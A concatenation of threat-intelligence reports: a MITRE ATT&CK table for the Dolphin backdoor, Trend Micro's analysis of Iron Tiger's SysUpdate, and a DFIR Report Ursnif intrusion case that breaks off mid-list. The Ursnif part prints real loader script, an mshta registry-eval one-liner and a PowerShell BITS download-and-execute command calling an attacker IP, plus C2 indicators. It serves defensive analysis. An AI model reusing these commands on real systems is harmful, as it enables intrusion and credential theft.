MSDolphin backdoor version 3.0 (x64) MITRE ATT&CK techniques This table was built using version 12 of the MITRE ATT&CK framework. 
TacticIDNameDescription Initial AccessT1189Drive-by CompromiseScarCruft uses watering-hole attacks to compromise victims. 
ExecutionT1059.006Command and Scripting Interpreter:
PythonThe Dolphin loader a uses Python script. 
T1059.007Command and Scripting Interpreter: JavaScriptScarCruft used malicious JavaScript for a watering-hole attack. T1203Exploitation for Client ExecutionScarCruft exploits CVE-2020-1380 to compromise victims. 
T1106Native
APIDolphin uses Windows API functions to execute files and inject processes. 
PersistenceT1053.005Scheduled Task/Job: Scheduled TaskDolphin uses a temporary scheduled task to start after installation. T1547.001Boot or Logon Autostart Execution: Registry Run Keys / Startup FolderDolphin uses Run keys for persistence of its loader. 
Defense EvasionT1055.002Process Injection: Portable Executable InjectionDolphin can inject into other processes. 
T1027Obfuscated Files or InformationDolphin has encrypted components. 
Credential AccessT1555.003Credentials from Password Stores: Credentials from Web BrowsersDolphin can obtain saved passwords from browsers. 
T1539Steal Web Session CookieDolphin can obtain cookies from browsers. 
DiscoveryT1010Application Window DiscoveryDolphin captures the title of the active window. 
T1083File and Directory DiscoveryDolphin can obtain file and directory listings. 
T1518.001Software Discovery: Security Software DiscoveryDolphin obtains a list of installed security software. 
T1082System Information DiscoveryDolphin obtains various system information including OS version, computer name and RAM size. 
T1016System Network Configuration DiscoveryDolphin obtains the device’s local and external IP address. 
T1016.001System Network Configuration Discovery: Internet Connection DiscoveryDolphin checks internet connectivity. 
T1033System Owner/User DiscoveryDolphin obtains the victim’s username. 
T1124System Time DiscoveryDolphin obtains the victim’s current time. 
CollectionT1056.001Input Capture:
KeyloggingDolphin can log keystrokes. 
T1560.002Archive Collected Data: Archive via LibraryUsing the Zipper library, Dolphin compresses and encrypts collected data before exfiltration. 
T1119Automated CollectionDolphin periodically collects files with certain extensions from drives. 
T1005Data from Local SystemDolphin can collect files from local drives. 
T1025Data from Removable MediaDolphin can collect files from removable drives. 
T1074.001Data Staged: Local Data StagingDolphin stages collected data in a directory before exfiltration. 
T1113Screen
CaptureDolphin can capture screenshots. 
Command and ControlT1071.001Application Layer Protocol: Web ProtocolsDolphin uses HTTPS to communicate with Google Drive. 
T1102.002Web Service: Bidirectional CommunicationDolphin communicates with Google Drive to download commands and exfiltrate data. 
ExfiltrationT1020Automated ExfiltrationDolphin periodically exfiltrates collected data. 
T1567.002Exfiltration Over Web Service: Exfiltration to Cloud StorageDolphin exfiltrates data to Google Drive. 
30 Nov 2022 - 11:30AM 
title: Iron Tiger’s SysUpdate Reappears, Adds Linux Targeting url: https://www.trendmicro.com/en_us/research/23/c/iron-tiger-sysupdate-adds-linux-targeting.html APT & Targeted Attacks Iron Tiger’s SysUpdate Reappears, Adds Linux Targeting We detail the update that advanced persistent threat (APT) group Iron Tiger made on the custom malware family SysUpdate.
In this version, we also found components that enable the malware to compromise Linux systems. 
By: Daniel Lunghi March 01, 2023Read time: ( words) Save to Folio Subscribe Iron Tiger is an advanced persistent threat (APT) that has been focused primarily on cyberespionage for more than a decade.
In 2022, we noticed that they updated SysUpdate, one of their custom malware families, to include new features and add malware infection support for the Linux platform. 
We found the oldest sample of this updated version in July 2022.
At the time, we attributed the sample to Iron Tiger but had not yet identified the final payload.
It was only after finding multiple similar payloads in late October 2022 that we looked further and found similarities with the SysUpdate malware family that had also been updated in 2021.
As with the previous version, Iron Tiger had made the loading logic complex, probably in an attempt to evade security solutions. 
This new version has similar features to the 2021 version, except that the C++ run-time type information (RTTI) classes we previously observed in 2021 had been removed, and that the code structure was changed to use the ASIO C++ asynchronous library.
Both changes make reverse engineering the samples longer.
We strongly advise organizations and users in the targeted industries to reinforce their security measures to defend their systems and stored information from this ongoing campaign. 
Campaign development timeline These are the key dates for understanding the chronology of Iron Tiger’s operations: Apr. 2, 2022: Registration of the domain name linked to our oldest Windows sample of SysUpdate May 11, 2022:
The command and control (C&C) infrastructure was set up. 
June 8, 2022:
While this could have been tampered with, observed compilation date of our oldest Windows sample. July 20, 2022:
Oldest Windows sample gets uploaded to Virus Total Oct. 24, 2022:
Oldest Linux sample gets uploaded to Virus Total We observed that the attacker registered the oldest domain name one month before starting the C&C configuration then waited one more month before compiling the malicious sample linked to that domain name.
We think the gap between the two updates allows the attackers to plan their operations accordingly. 
Loading process We observed the loading process entailing the following steps: The attacker runs rc.exe, a legitimate “Microsoft Resource Compiler” signed file , which is vulnerable to a DLL side-loading vulnerability, and loads a file named rc.dll. 
The malicious rc.dll loads a file named rc.bin in memory. 
The rc.bin file is a Shikata Ga Nai encoded shellcode that decompresses and loads the first stage in memory.
Depending on the number of command line parameters, different actions are performed: Zero or two parameters: “Installs” the malware in the system, and calls Stage 1 again via process hollowing with four parameters One parameter: Same as previous action but without the “installation” Four parameters: Creates a memory section with the DES-encrypted malware configuration and a second Shikata Ga Nai shellcode decompressing and loading Stage 2.
It then runs Stage 2 via process hollowing. 
The “installation” step is considered simple wherein the malware moves the files to a hardcoded folder.
Depending on the privileges of the process, the malware either creates a registry key or a service that launches the moved executable rc.exe with one parameter.
This ensures that the malware will be launched during the next reboot, skipping the installation part. 
Figure 1.
Updated SysUpdate loading process routine We saw different legitimate executables being used, sideloading different DLL names, and multiple binary files names being loaded by those DLLs.
We identified the executables and sideloaded files as follows: 
Table 1.
SysUpdate’s seemingly legitimate executables and their respective sideloaded files Legitimate application name Certificate signer Side-loaded DLL name Loaded binary file name INISafeWebSSO.exe Initech inicore_v2.3.30.dll inicore_v2.3.30.bin rc.exe Microsoft rcdll.dll rcdll.bin dlpumgr32.exe DESlock DLPPREM32.dll sv.bin GDFInstall.exe UBISOFT ENTERTAINMENT GameuxInstallHelper.DLL sysconfig.bin route-null.exe Wazuh libwazuhshared.dll wazuhext.bin route-null.exe Wazuh libwazuhshared.dll agent-config.bin wazuh-agent.exe Wazuh libwinpthread-1.dll wazuhext.bin We want to highlight that this is the first time we observed a threat actor abusing a sideloading vulnerability in a Wazuh signed executable.
Wazuh is a free and open source security platform, and we could confirm that one of the victims was using the legitimate Wazuh platform.
It is highly likely that Iron Tiger specifically looked for this vulnerability to appear legitimate in the victim’s environment.
We have notified the affected victim of this intrusion but received no feedback. 
Malware features Looking at the features, several of the functions found in the latest update are similar to the previous SysUpdate version: Service manager (lists, starts, stops, and deletes services) Screenshot grab Process manager (browses and terminates processes) Drive information retrieval File manager (finds, deletes, renames, uploads, downloads a file, and browses a directory) 
Command execution Iron Tiger also added a feature that had not been seen before in this malware family:
C&C communication through DNS TXT requests.
While DNS is not supposed to be a communication protocol, the attacker abuses this protocol to send and receive information. 
Figure 2.
C&C communication with DNS TXT records First, the malware retrieves the configured DNS servers by calling the GetNetworkParams API function and parsing the DnsServerList linked list.
If this method fails, the malware uses the DNS server operated by Google at IP address 8.8.8.8. 
For the first request, the malware generates a random number of 32 bits and appends 0x2191 to it.
This results in six bytes — four for the random number, two for 0x2191 — and encodes the result further with Base32 algorithm using the alphabet “abcdefghijklmnopqrstuvwxyz012345”.
Looking at Figure 2, the contacted domain name is after "TXT"; only the first four letters change as the rest of the encoded series is always the same.
This is because the random number changes every time, but the end is the same “0x2191” result.
This explains why the first DNS request always ends with “reeaaaaaa.<c&c domain>”.
If the C&C reply matches the format expected by the malware, it launches multiple threads that handle further commands and sends information about the infected machine. 
Interestingly, the code related to this DNS C&C communication is only present in samples that use it, meaning that the builder is modular and that there might be samples in the wild with unreported features.
We continue monitoring this group and malware family for updates on possible variations of C&C communication protocols being abused. 
In all versions, the malware retrieves information on the infected machine and sends it to the C&C encrypted with DES.
Collected machine information includes the following: Randomly generated GUID Hostname Domain name Username User privileges Processor architecture Current process ID Operating system version Current file path Local IP address and port used to send the network packet The configuration is encrypted with a hardcoded DES key and is a few bytes long following the structure enumerated below: Table 2.
Configuration structure Field content Length (in bytes) Comment Example Header 4 
We only found one value 0x00000001 GUID 38 Follows the Microsoft format {89D0E853-FA08-4f94-A5FE-A90E6869E074} Size of the C&C section 4 0x00000018 Size of the next C&C domain name and port 4 0x00000014 C&C type 1 0x01 = regular C&C 0x05
= DNS tunneling 0x00
= regular C&C 0x01 C&C domain name Variable dev.gitlabs.me Port number 4 0x00000050 Size of next section 4 Next section contains all the hardcoded names (folder, files, registry values) 0x00000034 Name of the hardcoded directory where files are copied Variable The folder is located either in % gtdcfp Name of the executable vulnerable to side loading Variable TextInputHost.exe Name of the malicious side-loaded DLL Variable rc.dll Name of the binary file containing the encoded Stage 1 Variable rc.bin Name of the service or registry key value used for persistence Variable gtdcfp We noted that Stage 2 does not embed the configuration file, which is copied in memory by the previous stage.
We only saw one case where there was only one stage being decrypted in memory and the configuration was hardcoded. 
Interestingly, all the samples of this “new” version had a domain name as its C&C. In the previous version of SysUpdate, the group used hardcoded IP addresses as C&C. It is possible that this change is a consequence of the new DNS TXT records’ communication feature as it requires a domain name. 
SysUpdate samples for Linux While investigating SysUpdate’s infrastructure, we found some ELF files linked to some C&C servers.
We analyzed them and concluded that the files were a SysUpdate version made for the Linux platform.
The ELF samples were also written in C++, made use of the Asio library, shared common network encryption keys, and had many similar features.
For example, the file handling functions are almost the same.
It is possible that the developer made use of the Asio library because of its portability across multiple platforms. 
Some parameters can be passed to the binary (note that “Boolean” refers to Boolean data that is sent to the C&C): 
Table 3.
Parameters passed to the binary as observed from Linux SysUpdate samples Parameter Effect -launch Sets persistence, zeroes boolean, and exits -run Zeroes boolean and continues -x Daemonize the process, zeroes boolean, and continues -i Daemonize the process, zeroes boolean, sets persistence, and continues -f <guid> Sets the GUID to <guid> and continues The persistence is ensured by copying a script similarly named as the current filename to the /usr/lib/systemd/system/ directory, and creating a symlink to this file in the /etc/ystem/system/multi-user.target.wants/ directory.
Thus, this method only works if the current process has root privileges.
The content of the script is: 
[Unit] Description=xxx [Service] Type=forking ExecStart=<path to current file> -x ExecStop=/usr/bin/id [Install] WantedBy=multi-user.target After running the code dependent on the parameters, if the operator has not chosen a GUID with the “-f” parameter, the malware generates a random GUID and writes it to a file similarly named as the current file, with a “d” appended to it.
Then, the malware retrieves information on the compromised computer and sends it to the C&C. The following information is sent to the C&C, encrypted with a hardcoded key and DES CBC algorithm: GUID Host name Username Local IP address and port used to send the request Current PID Kernel version and machine architecture Current file path Boolean (0 if it was launched with exactly one parameter, 1 otherwise) 
For the DNS C&C communication version, the malware retrieves the configured DNS server by reading the content of the /etc/resolv.conf file, or uses the DNS server operated by Google at IP address 8.8.8.8. 
In 2022, we already noticed that this threat actor was interested in platforms other than Windows, with the rshell malware family running on Linux and Mac OS.
For these reasons, we would not be surprised to see SysUpdate samples for the Mac OS platform in the future.
Interestingly, most of the Linux samples we found used the new DNS tunneling feature we detailed in Figure 2, while only one of the Windows’ samples used it. 
Certificate compromise Another interesting part of this campaign is the fact that some of the malicious files are signed with a certificate with the following signer: “Permyakov Ivan Yurievich IP”.
Looking for that name in search engines brings results from the official VMProtect website.
The email address linked to the Authenticode certificate also links to that domain name.
VMProtect is a commercial software intended to make analysis of code extremely difficult by implementing a custom virtual machine with non-standard architecture.
The software has been used by multiple APT and cybercrime groups in the past to obfuscate their malware. 
When searching on malware repositories for other files signed by the same certificate, we find multiple files named “VMProtectDemo.exe”, “VMProtect.exe”, or “VMProtect_Con.exe”, which suggests that an official demo version of VMProtect is also signed by this certificate.
It appears that the threat actor managed to retrieve the private key allowing him to sign malicious code.
As of this writing, the certificate is now revoked. 
Using stolen certificates to sign malicious code is a common practice for this threat actor, as we already highlighted in 2015 and in all our recent investigations.
Interestingly, the threat actor not only signed some of its malicious executables with the stolen certificate, but also used VMProtect to obfuscate one of them. 
In late January 2023, a Redline stealer sample (detected by Trend Micro as TrojanSpy.Win32.REDLINE.YXDA1Z, SHA256: e24b29a1df287fe947018c33590a0b443d6967944b281b70fba7ea6556d00109) signed by the same certificate was uploaded.
We do not believe that the stealer is linked to Iron Tiger, considering that the network infrastructure is different, and previous reports document the malware’s goals to be centered on committing cybercrime than data theft.
This could mean other users managed to extract the same private key from the VMProtect demo version, or it was sold in the underground to different groups, Iron Tiger among them. 
Infection vector We did not find an infection vector.
However, we noticed that one of the executables packed with VMProtect and signed with the stolen certificate was named “youdu_client_211.9.194.exe”.
Youdu is the name of a Chinese instant messaging application aimed for use of enterprise customers.
Its website mentions multiple customers in many industries, some of them in critical sectors such as government, energy, healthcare, or banking.
But they also have other customers in industries such as gaming, IT, media, construction, and retail, apparently all located inside China. 
The properties of the malicious file also match the usual Youdu version numbering.
However, the legitimate files are signed with a “Xinda.im” certificate instead of the stolen VMProtect certificate. 
Figure 3.
Comparing the properties of the malicious file (left), and properties of the legitimate Youdu installer (right) 
As seen in the product name identified in the malicious file’s properties, we searched for possible products named “i Talk” but did not find any that could be related to this investigation.
However, we found traces of files from the legitimate Youdu chat application signed by Xinda.im being copied to folders named “i Talk” on one victim’s computer.
This suggests that some chat application named “i Talk” might be repackaging components from the official Youdu client along with malicious executables.
It appears that a chat application was used as a lure to entice the victim into opening the malicious file.
This would be consistent with the tactics, techniques, and procedures (TTPs) of two previous Iron Tiger campaigns from 2020 and 2021: a documented compromise of a chat application widely used by the Mongolian government, and a supply chain attack on Mimi chat, a chat application used in parts of South East Asia. 
Post-exploitation tools We found a custom Chrome password and cookie grabber that appeared unfamiliar, and it was compiled and uploaded in September 2022.
The file was also signed with the VMProtect certificate but it was not obfuscated.
In general, the features were simple; the malware decrypts the saved passwords to a file named “passwords.txt”, and the cookies to a file named “cookies.txt”. 
Analyzing its details, the malware first parses the “Local State” file to retrieve the AES key used to encrypt the cookies and passwords.
It then copies the “Login Data” file to a temporary file “chromedb_tmp”, issues an SQL query to extract the URL, login, and password fields from the file, and then decrypts them and appends the result to the “passwords.txt” file. 
It proceeds to copy the “Cookies” file to a temporary file “chromedb_tmp”, extracts multiple fields from it using an SQL query, and then decrypts the content before copying the result to the “cookies.txt” file.
Some specific cookies related to Google domain names are ignored, probably because they are mostly related to specific Google features or tracking that are considered useless by the threat actor. 
We found two other samples from this stealer: One compilation date indicated an executable built in November 2020, and the other one in December 2021, although those dates could be tampered with.
We found those samples were uploaded on November 2021 and August 2022, meaning this stealer existed since at least late 2021. 
Targeting We identified one gambling company in the Philippines as compromised by this campaign.
Interestingly, the threat actor registered a domain name similar to the company name and used it as a C&C.
This was not surprising as we have noticed this threat actor targeting this industry since 2019 during our Operation DRBControl investigation, and later in 2021 with an update of SysUpdate.
We also attempted to notify the company of this incident through all their listed channels but have received no feedback. 
As stated in the “Infection Vector” section, we noticed the Youdu chat application was probably used as a lure.
It is worth mentioning that the customers mentioned in the Youdu official website are all located inside China, which could be an indicator of the threat actor’s interest in targets related to this country. 
Conclusion This investigation confirms that Iron Tiger regularly updates its tools to add new features and probably to ease their portability to other platforms, verifying the interest we found from this threat actor for Linux or Mac OS.
It also corroborates this threat actor’s interest in the gambling industry and the South East Asia region, as we previously noted in 2020 and 2021. 
This campaign also substantiates the regular usage of chat applications as infection vectors from Iron Tiger.
We expect to find further updates of these tools in the future to accommodate other platforms and apps. 
As an additional warning, we want to highlight that the targeting can be wider than the samples and targeting we have already observed.
In 2022, we discussed a campaign targeting Taiwan and the Philippines that made use of HyperBro samples (detected by Trend Micro as Backdoor.
Win32.HYPERBRO.ENC) signed with a stolen Cheetah certificate.
The BfV, a German governmental entity, published a report in January 2022 mentioning attacks against German companies with HyperBro samples that were also signed with the same certificate.
In October 2022, Intrinsec reported an incident in a French company also using HyperBro samples matching the structure we described in our 2021 investigation.
This shows the threat actor is likely to reuse the tools mentioned here in future campaigns that might target different regions or industries in the short and long term.
Considering the active campaign and regular developments made on this malware family, organizations are advised to enhance and broaden their current and established security measures, and heighten overall vigilance for possible infection vectors that can be abused by this threat group. 
Indicators of Compromise (IOCs) Download the full list of indicators here. 
Authors Daniel Lunghi Threat Researcher 
title: Unwrapping Ursnifs Gifts -
The DFIR Report url: https://thedfirreport.com/2023/01/09/unwrapping-ursnifs-gifts/ In late August 2022, we investigated an incident involving Ursnif malware, which resulted in Cobalt Strike being deployed.
This was followed by the threat actors moving laterally throughout the environment using an admin account. 
The Ursnif malware family (also commonly referred to as Gozi or ISFB) is one of the oldest banking trojans still active today.
It has an extensive past of code forks and evolutions that has lead to several active variants in the last 5 years including Dreambot, IAP, RM2, RM3 and most recently, LDR4. 
For this report, we have referred to the malware as Ursnif for simplicity, however we also recommend reading Mandiant’s article on LDR4. 
Case Summary In this intrusion, a malicious ISO file was delivered to a user which contained Ursnif malware.
The malware displayed an interesting execution flow, which included using a renamed copy of rundll32.
Once executed, the malware conducted automatic discovery on the beachhead host, as we have observed with other loaders such as IcedID.
The malware also established persistence on the host with the creation of a registry run key. 
Approximately 4 days after the initial infection, new activity on the host provided a clear distinction of a threat actor performing manual actions (hands on keyboard).
The threat actor used a Background Intelligent Transfer Service (BITS) job to download a Cobalt Strike beacon, and then used the beacon for subsequent actions. 
The threat actor first ran some initial discovery on the host using built-in Windows utilities like ipconfig, systeminfo, net, and ping.
Shortly afterwards, the threat actor injected into various processes and then proceeded to access lsass memory on the host to extract credentials. 
Using the credentials extracted from memory, the threat actors began to move laterally.
They targeted a domain controller and used Impacket’s wmiexec.py to execute code on the remote host.
This included executing both a msi installer for the RMM tools Atera and Splashtop, as well as a Cobalt Strike executable beacon.
These files were transferred to the domain controller over SMB. 
After connecting to the Cobalt Strike beacon on the domain controller, the threat actor executed another round of discovery tasks and dumped lsass memory on the domain controller.
Finally, they dropped a script named adcomp.bat which executed a PowerShell command to collect data on computers in the Windows domain. 
The following day, there was a short check-in on the beachhead host from a Cobalt Strike beacon, no other activity occurred until near the end of the day.
At that time, the threat actor became active by initiating a proxied RDP connection via the Cobalt Strike beacon to the domain controller.
From there, the threat actor began connecting to various hosts across the network. 
One host of interest was one of the backup servers, which was logged into, the state of backups were checked and running processes were reviewed before exiting the session.
The threat actor was later evicted from the network. 
Services We offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, BumbleBee, Covenant, Metasploit, Empire, PoshC2, etc.
More information on this service and others can be found here. 
The Cobalt Strike server in this case was added to our feed on July 18, 2022, over 2 months before it was used in this case. 
We also have artifacts and IOCs available from this case such as pcaps, memory captures, files, and event logs including Sysmon under our Security Researcher and Organization services. 
Timeline Analysis and reporting completed by @_pete_0, @svch0st and UC1. 
Initial Access In this case, the Ursnif malware was delivered using a very familiar technique of being contained within an ISO file. 
The DFIR Report has previously reported on several incidents that involved the tactic of delivering malicious flies using ISO files: As we have previously highlighted, the Event Log Microsoft-Windows-VHDMP-Operational.evtx contains high confidence evidence when users mount ISO files.
We recommend looking for these events (especially Event ID’s 1, 12 & 25) in your environment and checking for anomalies. 
In this case, the user had saved the file 3488164.iso to the their downloads folder and mounted it. 
Once mounted, the new drive contained a LNK file 6570872.lnk and hidden folder “me”. 
If we parse this LNK file with LECmd (by Eric Zimmerman), it highlights the execution path and the icon it appears as: The contents of hidden folder “me”, included several files and folders that were used for the execution of Ursnif.
Of interest, the folder included a legitimate copy of rundll32.exe (renamed to 123.com). 
Summary of the files found in 3488164.iso (a detailed break down of these can be found in Execution): File Name Purpose 6570872.lnk LNK file that executes alsoOne.bat me/by Empty folder me/here Empty folder me/123.com Renamed legitimate version of rundll32.exe me/alsoOne.bat Batch script to run canWell.js with specific arguments me/canWell.js Reverses argument strings and executes tslt.db with 123.com me/itslt.db Ursnif DLL or.jpg Image not used. 
Execution Once the user had mounted the ISO and the LNK file was executed by the user, the complex execution flow started. 
Ursnif Malware Highlighted in Initial Access, the LNK file would execute a batch script alsoOne.bat .
This script called a JavaScript file canWell.js in the same directory and provided a number of strings as arguments. alsoOne.bat set %params%=hello me\canWell.js hello cexe lldnur revreSretsigeRllD canWell.js /** WhnldGh */ function reverseString(str) { var splitString = str.split(""); var reverseArray = splitString.reverse(); var joinArray = reverseArray.join(""); return joinArray; } function ar(id) { r = WScript.Arguments(id); return r; } var sh = WScript.CreateObject("WScript.
Shell"); sh[reverseString(ar(1))]("me\\123.com me/itsIt.db,"+reverseString(a The JS file was then executed with wscript.exe and used the provided command line arguments, which created and executed the following command using WScript.
Shell.
Exec(): me/123.com me/itsIt.db,DllRegisterServer Using the SRUM database, we were able to determine that the custom rundll32.exe binary downloaded approximately 0.4 MB of data. 
Once the malware was executed, the parent instance of explorer launched MSHTA with the following command: "C:\Windows\System32\mshta.exe" "about:<hta:application><script>Cxak='wscript.shell';resizeTo(0,2);eval(new ActiveXObject(Cxak).regread('HKCU\\\Software\\AppDataLow\\Software\\Microsoft\\472A62F9-FA62-1196-3C6B-CED530CFE2D9\\\ActiveDevice'));if(!window.flag)close()</script>" This oneliner created a new ActiveX object to eval() the content stored in the registry key in the users registry hive.
The content of the value “ActiveDevice”: The payload used another ActiveX object to run a PowerShell command.
This command created additional aliases of common default PowerShell aliases gp (Get-ItemProperty) and iex (Invoke-Expression).
These two new aliases were used to get and execute the content in another registry value “MemoryJunk”: Ahgvof=new ActiveXObject('WScript.
Shell');Ahgvof.
Run('powershell new-alias -name qirlbtfhgo -value gp; new-alias -name kvikpt -value iex; kvikpt ([System.
Text.
Encoding]::ASCII.GetString((qirlbtfhgo "HKCU:\Software\\AppDataLow\\Software\\Microsoft\\472A62F9-FA62-1196-3C6B-CED530CFE2D9").MemoryJunk))',0,0)
; Analyst Note: The names of the registry values changed when we ran the payload in a sandbox during analysis, and hence suspected to be generated at random at execution. 
The last registry key was used to store additional PowerShell code.
This script called a combination of QueueUserAPC, GetCurrentThreadId, OpenThread, and VirtualAlloc to perform process injection of shellcode stored in Base64. 
When Add-Type cmdlet is executed, the C# compiler csc.exe is invoked by PowerShell to compile this class definition, which results in the creation of temporary files in %APPDATA%\Local\Temp. 
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
/noconfig /fullpaths
@"C:\Users\<REDACTED>\AppData\Local\Temp\npfdesjp\npfdesjp.cmdline" Finally, a unique command spawned from the parent explorer.exe process that was called pause.exe with multiple arguments, which appeared to not provide any additional functionality. 
"C:\Windows\syswow64\cmd.exe" /C pause dll mail, , A sigma rule for this cmdline can be found in the Detections section of this report. 
At this point in time, less than a minute of time has elapsed since the user first opened the malware. 
Once the malware was established on the host, there was limited malicious activity, until around 3 days later.
That is when we began to observe evidence indicative of “hands-on-keyboard” activity. 
Cobalt Strike An instance of cmd.exe was launched through explorer.exe which ran the following command: powershell.exe -nop -c "start-job { param($a) Import-Module BitsTransfer; $d = $env:temp + '\'
+
[System.
IO.Path]::GetRandomFileName(); Start-BitsTransfer -Source 'hxxp://193.201.9.199:80/a’ -Destination $d; $t =
[IO.File]::ReadAllText($d); Remove-Item $d; IEX $t } -Argument 0
| wait-job | Receive-Job" Analyst Note: Ursnif has been known to have VNC-like capabilities.
It is possible this explorer.exe ➝ cmd.exe session was through a VNC session. 
This PowerShell command started a BITS job to download a Cobalt Strike beacon from 193.201.9[.]199 and saved it with a random name to %TEMP%.
It then read the file into a variable, and deleted it before executing content with IEX. 
The event log Microsoft-Windows-Bits-Client%254Operational.evtx corroborated this activity: The activity following this event demonstrated a clear distinction of the threat actor performing discovery manually. 
Persistence Once the foothold had been achieved, after execution of Ursnif on the beachhead host, persistence was achieved by creating a ‘Run’ key named ManagerText which was configured to execute a LNK file which executed a PowerShell script. 
Credential Access We observed a process created by Cobalt Strike accessing lsass.exe.
The GrantedAccess code of 0x1010 is a known indicator of such tools as Mimikatz.
This was observed on both the beachhead host and a domain controller. 
LogName=Microsoft-Windows-Sysmon/Operational EventCode=10 EventType=4 ComputerName=<REDACTED> User=SYSTEM Sid=S-1-5-18 SidType=1 SourceName=Microsoft-Windows-Sysmon Type=Information RecordNumber=765707 Keywords=None TaskCategory=Process accessed (rule: ProcessAccess) OpCode=Info Message=Process accessed: RuleName: technique_id=T1003,technique_name=Credential Dumping UtcTime: <REDACTED> SourceProcessGUID: {aaadb608-97b2-630c-6750-000000000400} SourceProcessId: 4768 SourceThreadId: 4248 SourceImage: C:\Windows\system32\rundll32.exe TargetProcessGUID: {aaadb608-45a2-62fc-0c00-000000000400} TargetProcessId: 672 TargetImage: C:\Windows\system32\lsass.exe 
GrantedAccess: 0x1010 CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9fc24|C:\Windows\System32\KERNELBASE.dll+20d0e|UNKNOWN(000002AA74CFD95C) Discovery Ursnif related discovery As we have observed in other malware, Ursnif ran a number of automated discovery commands to gain information about the environment.
The following commands were executed and their standard output was redirected to append to a file in the user’s %APPDATA%\Local\Temp\ cmd /C
"wmic computersystem get domain |more >
C:\Users\<REDACTED>\AppData\Local\Temp\BD2C.bin1" cmd /C
"echo -------- >>
"systeminfo.exe >
"net view >>
"nslookup 127.0.0.1 >>
"tasklist.exe /SVC >>
"driverquery.exe >>
"reg.exe query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s >>
"nltest /domain_trusts >>
"net config workstation >>
"nltest /domain_trusts /all_trusts >>
"net view /all /domain
>>
"net view /all >>
C:\Users\<REDACTED>\AppData\Local\Temp\BD2C.bin1" Manual discovery Once the threat actor had Cobalt Strike running on the beachhead host, they ran the following commands: whoami whoami /groups time ipconfig /all systeminfo The threat actor quickly took interest in a support account.
This account belonged to the Domain Admin group. 
net user <REDACTED> 
The threat actor also used a batch script to collect a list of all computer objects on the domain using C:\Windows\system32\cmd.exe /C adcomp.bat which contained the PowerShell command: powershell Get-ADComputer -Filter * -Properties Name,Operatingsystem, OperatingSystemVersion, OperatingSystemServicePack,IPv4Address >> log2.txt During the final actions taken by the threat actors before eviction, after completing RDP connections to various hosts on the network, the threat actors checked running processes on the accessed hosts via taskmanager, which were started via their interactive RDP session as noted by the /4 command line argument. 
C:\Windows\system32\taskmgr.exe /4 Lateral Movement WMI was used to pivot to a domain controller on the network.
The actor leveraged Impacket’s wmiexec.py to execute commands with a semi-interactive shell, most likely using credentials gathered by the previous LSASS access. 
The commands executed included directory traversal, host discovery, and execution of tools on the DC. 
A breakdown of the parent and child processes invoked: The command can be broken down as follows: ‘Q’ indicates turn off echo – no response. 
‘C’ indicates to stop after command execution. 
The 127.0.01 and ADMIN$ indicates C:\Windows. 
Output is achieved via the parameter ‘2>&1’, to redirect errors and output to one file: This command line closely resembles the code within the wmiexec.py as part of the Impacket tool maintained by Fortra. 
As Impacket interacts with remote endpoints via WMI over TCP via DCERPC, its possible to inspect network level packets: The use of Impacket by threat actors has been recently detailed by the US CERT in alert AA22-277A – Impacket and Exfiltration Tool Used to Steal Sensitive Information from Defense Industrial Base Organization. 
The Impacket process hierarchy in this case can be visualized as: At the network level, commands are issued by DCOM/RPC port 135, with responses by SMB using port 445.
We can observe a number of WMI requests via DCERPC from one endpoint to a target endpoint based on the ports. 
Correlating the network activity to the host activity confirms that the ‘Powershell.exe’ process initiated the WMI requests. 
The destination port is within the ephemeral port range 49152–65535, which is for short-lived, time based, communications RFC 6335. 
13Cubed (Richard Davis) also released an amazing resource to investigate Impacket related incidents here: https://www.13cubed.com/downloads/impacket_exec_commands_cheat_sheet_poster.pdf One of the observed commands invoked via WMI was ‘firefox.exe’. 
This was dropped on the DC and spawned a number of processes and invoked a number of hands-on commands. 
The process generated a significant volume of network connections to 193.201.9[.]199, averaging ~6K requests per hour, equating to >150K connections throughout the duration of the intrusion. 
RDP was also used by the threat actor on the final two days of the intrusion to connect to various hosts from a domain controller proxying the traffic via the firefox.exe Cobalt Strike beacon. Command and Control Ursnif Ursnif was seen using the following domains and IPs: 5.42.199.83superliner.top 62.173.149.7 internetlines.in 31.41.44.97 superstarts.top 31.41.44.27 superlinez.top 31.41.44.27 internetlined.com 208.91.197.91 denterdrigx.com: 187.190.48.135 210.92.250.133 189.143.170.233 201.103.222.246 151.251.24.5 190.147.189.122 115.88.24.202 211.40.39.251 187.195.146.2 186.182.55.44 222.232.238.243 211.119.84.111 51.211.212.188 203.91.116.53 115.88.24.203 190.117.75.91 181.197.121.228 190.167.61.79 109.102.255.230 211.119.84.112 190.107.133.19 185.95.186.58 175.120.254.9 46.194.108.30 190.225.159.63 190.140.74.43 187.156.56.52 195.158.3.162 138.36.3.134 109.98.58.98 24.232.210.245 222.236.49.123 175.126.109.15 124.109.61.160 95.107.163.44 93.152.141.65 5.204.145.65 116.121.62.237 31.166.129.162 222.236.49.124 211.171.233.129 211.171.233.126 211.53.230.67 196.200.111.5 190.219.54.242 190.167.100.154 110.14.121.125 58.235.189.192 37.34.248.24 110.14.121.123 179.53.93.16 175.119.10.231 211.59.14.90 188.48.64.249 187.232.150.225 186.7.85.71 148.255.20.4 91.139.196.113 41.41.255.235 31.167.236.174 189.165.2.131 1.248.122.240 We also observed several modules for Ursnif downloaded from the following IP: 
